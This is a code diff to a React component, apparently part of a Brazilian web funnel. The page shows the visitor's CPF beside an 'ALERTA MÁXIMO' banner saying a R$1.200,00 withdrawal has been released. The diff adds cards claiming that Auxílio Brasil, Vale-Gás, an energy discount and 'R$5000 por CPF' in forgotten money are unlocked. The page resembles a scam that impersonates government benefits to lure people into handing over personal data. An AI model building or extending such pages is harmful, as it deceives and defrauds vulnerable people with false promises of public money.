@@ -83,7 +83,7 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
   const formattedCpf = cpf || '***.***.***-**';
 
   return (
-    <div className="w-full max-w-2xl mx-auto p-4 md:p-6 space-y-6 bg-background text-foreground">
+    <div className="w-full max-w-4xl mx-auto p-4 md:p-6 space-y-8 bg-background text-foreground">
         
         {/* Título Principal */}
         <div className="text-center">
@@ -91,6 +91,50 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
             <span>🔥 ALERTA MÁXIMO, CPF {formattedCpf}!</span><br/>
             SEU SAQUE DE <strong className="text-3xl md:text-4xl font-bold text-foreground">R$1.200,00</strong> FOI LIBERADO AGORA!
           </h2>
+        </div>
+
+        {/* Benefícios disponíveis em destaque */}
+        <div className="bg-card rounded-xl shadow-xl p-6 md:p-8 border-l-8 border-accent animate-scale-in">
+            <h2 className="text-2xl md:text-3xl font-black text-card-foreground mb-6 text-center">Acesso LIBERADO para você:</h2>
+
+            <div className="grid md:grid-cols-3 gap-6 mb-8">
+                {[
+                    {
+                        nome: "Programa Auxílio Brasil",
+                        valor: "R$ 1200/mês",
+                        icon: "💰",
+                        descricao: "Benefício mensal direto na sua conta!",
+                    },
+                    {
+                        nome: "Tarifa Social de Energia",
+                        valor: "Até 65% de desconto",
+                        icon: "⚡",
+                        descricao: "Redução significativa na sua conta de luz!",
+                    },
+                    {
+                        nome: "Vale-Gás Federal",
+                        valor: "R$ 120 mensal",
+                        icon: "🔥",
+                        descricao: "Auxílio para comprar seu gás sem aperto!",
+                    },
+                    {
+                        nome: "Dinheiro Perdido",
+                        valor: "R$5000 por CPF",
+                        icon: "💸",
+                        descricao: "Valores esquecidos em contas e bancos!",
+                    },
+                ].map((beneficio, index) => (
+                    <div key={index} className="bg-accent/10 p-6 rounded-lg border border-accent/30 shadow-md transform hover:scale-105 transition-all duration-200">
+                        <div className="text-center">
+                            <div className="text-4xl mb-3 animate-pulse-slow">{beneficio.icon}</div>
+                            <h3 className="font-bold text-card-foreground mb-2 text-lg">{beneficio.nome}</h3>
+                            <p className="text-accent font-black text-2xl mb-2">{beneficio.valor}</p>
+                            <p className="text-sm text-muted-foreground">{beneficio.descricao}</p>
+                            <CheckCircle className="text-accent mx-auto mt-3 animate-fade-in" size={24} />
+                        </div>
+                    </div>
+                ))}
+            </div>
         </div>
           
         {/* Lista de Benefícios */}
@@ -196,4 +240,3 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
 };
 
 export default OfferStep;
-
